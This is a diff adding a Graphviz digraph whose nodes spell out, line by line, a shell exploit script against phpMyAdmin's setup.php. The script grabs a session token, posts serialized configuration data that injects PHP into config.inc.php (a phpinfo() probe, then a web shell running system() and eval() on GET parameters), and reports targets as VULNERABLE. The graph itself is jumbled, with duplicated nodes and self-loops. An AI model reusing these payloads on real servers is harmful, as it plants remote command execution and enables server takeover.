@@ -1,0 +1,102 @@
+digraph {
+0 [label="BLK=\x1b[1 "];
+0 -> 0
+2 [label="DRED=\x1b[0 "];
+2 -> 4 [label="N,"];
+4 [label="DGRN=\x1b[0 "];
+4 -> 6 [label="N,"];
+6 [label="DBLU=\x1b[0 "];
+6 -> 8 [label="N,"];
+8 [label="DWHI=\x1b[0 "];
+8 -> 10 [label="N,"];
+10 [label="BLU=\x1b[1 "];
+10 -> 12 [label="N,"];
+12 [label="RES=\x1b[0m "];
+12 -> 14 [label="N,"];
+14 [label="[ -f /bin/curl ] "];
+14 -> 16 [label="N,SC,N,if,"];
+16 [label="curl=/bin/curl "];
+16 -> 18 [label=";,then,"];
+18 [label="[ -f /usr/bin/curl ] "];
+18 -> 20 [label="N,else,SC,N,if,"];
+20 [label="curl=/usr/bin/curl "];
+20 -> 22 [label=";,then,"];
+22 [label="[ -f /usr/local/bin/curl ] "];
+22 -> 24 [label="N,else,SC,N,if,"];
+24 [label="curl=/usr/local/bin/curl "];
+24 -> 26 [label=";,then,"];
+26 [label="curl=./curl "];
+26 -> 28 [label="N,else,"];
+28 [label="postdata=token=$1&action=save&configuration=a:1:{s:7:%22Servers%22%3ba:1:{i:0%3ba:6:{s:23:%22host%27]=%27%27%3b%20phpinfo%28%29%3b//%22%3bs:9:%22localhost%22%3bs:9:%22extension%22%3bs:6:%22mysqli%22%3bs:12:%22connect_type%22%3bs:3:%22tcp%22%3bs:8:%22compress%22%3bb:0%3bs:9:%22auth_type%22%3bs:6:%22config%22%3bs:4:%22user%22%3bs:4:%22root%22%3b}}}&eoltype=unix "];
+28 -> 30 [label="N,fi,fi,fi,N,function,SC,{,"];
+30 [label="postdata2=token=$1&action=save&configuration=a:1:{s:7:%22Servers%22%3ba:1:{i:0%3ba:6:{s:136:%22host%27%5d=%27%27%3b%20if($_GET%5b%27c%27%5d){echo%20%27%3cpre%3e%27%3bsystem($_GET%5b%27c%27%5d)%3becho%20%27%3c/pre%3e%27%3b}if($_GET%5b%27p%27%5d){echo%20%27%3cpre%3e%27%3beval($_GET%5b%27p%27%5d)%3becho%20%27%3c/pre%3e%27%3b}%3b//%22%3bs:9:%22localhost%22%3bs:9:%22extension%22%3bs:6:%22mysqli%22%3bs:12:%22connect_type%22%3bs:3:%22tcp%22%3bs:8:%22compress%22%3bb:0%3bs:9:%22auth_type%22%3bs:6:%22config%22%3bs:4:%22user%22%3bs:4:%22root%22%3b}}}&eoltype=unix "];
+30 -> 32 [label="N,\n,"];
+32 [label="flag=/tmp/$(basename $0).$RANDOM.phpinfo.flag.html "];
+32 -> 68 [label="\n,"];
+68 [label="basename $0 "];
+68 -> 36 [label="N,N,"];
+36 [label="$curl -ks -b $2 -d $postdata --url $3/scripts/setup.php /dev/null "];
+36 -> 82 [label="\n,"];
+82 [label="/dev/null "];
+82 -> 82
+40 [label="$curl -ks --url $3/config/config.inc.php "];
+40 -> 42 [label="\n,SC,N,if,N,"];
+42 [label="grep phpinfo() /dev/null "];
+42 -> 82 [label="N,"];
+82 [label="/dev/null "];
+82 -> 82
+46 [label="$curl -ks --url $3/config/config.inc.php $flag "];
+46 -> 48 [label="then,"];
+48 [label="$flag "];
+48 -> 48
+50 [label="$curl -ks -b $2 -d $postdata2 --url $3/scripts/setup.php /dev/null "];
+50 -> 82 [label="\n,"];
+82 [label="/dev/null "];
+82 -> 82
+54 [label="echo ${DBLU}  --> *Server: ${BLK}[${DGRN}$3${BLK}] ${DBLU}is: ${DRED}VULNERABLE${RES} "];
+54 -> 56 [label="\n,"];
+56 [label="echo $3/config/config.inc.php log /dev/null "];
+56 -> 58 [label="\n,"];
+58 [label="log "];
+58 -> 58
+82 [label="/dev/null "];
+82 -> 82
+62 [label="echo ${DBLU}  --> *Server: ${BLK}[${DGRN}$3${BLK}] ${DBLU}is: ${DGRN}NOT VULNERABLE${RES} "];
+62 -> 99 [label="\n,else,"];
+99 [label="exit "];
+99 -> 66 [label="\n,"];
+66 [label="cookiejar=/tmp/$(basename $0).$RANDOM.txt "];
+66 -> 68 [label="\n,fi,\n,},"];
+68 [label="basename $0 "];
+68 -> 70 [label="N,N,"];
+70 [label="token=`curl -ks -c $cookiejar --url \"$1/scripts/setup.php\" | grep \\\"token\\\" | head -n 1 | cut -d \\\" -f 12` "];
+70 -> 70
+72 [label="curl -ks -c $cookiejar --url $1/scripts/setup.php "];
+72 -> 74 [label="N,N,N,"];
+74 [label="grep \"token\" "];
+74 -> 76 [label="N,"];
+76 [label="head -n 1 "];
+76 -> 78 [label="N,"];
+78 [label="cut -d \" -f 12 "];
+78 -> 80 [label="N,"];
+80 [label="grep phpMyAdmin $cookiejar /dev/null "];
+80 -> 82 [label="SC,N,if,"];
+82 [label="/dev/null "];
+82 -> 82
+84 [label="length=`echo -n $token | wc -c` "];
+84 -> 86 [label="then,"];
+86 [label="echo -n $token "];
+86 -> 88 [label="N,N,N,"];
+88 [label="wc -c "];
+88 -> 90 [label="N,"];
+90 [label="[ $length -eq 32 ] "];
+90 -> 92 [label="\n,SC,N,if,"];
+92 [label="exploit $token $cookiejar $1 "];
+92 -> 98 [label="then,"];
+98 [label="echo ${DBLU}  --> *Server: ${BLK}[${DGRN}$1${BLK}] ${DBLU}is: ${DGRN}NOT VULNERABLE${RES} "];
+98 -> 99 [label="else,"];
+99 [label="exit "];
+99 -> 98 [label="\n,"];
+98 [label="echo ${DBLU}  --> *Server: ${BLK}[${DGRN}$1${BLK}] ${DBLU}is: ${DGRN}NOT VULNERABLE${RES} "];
+98 -> 99 [label="\n,fi,\n,else,"];
+}
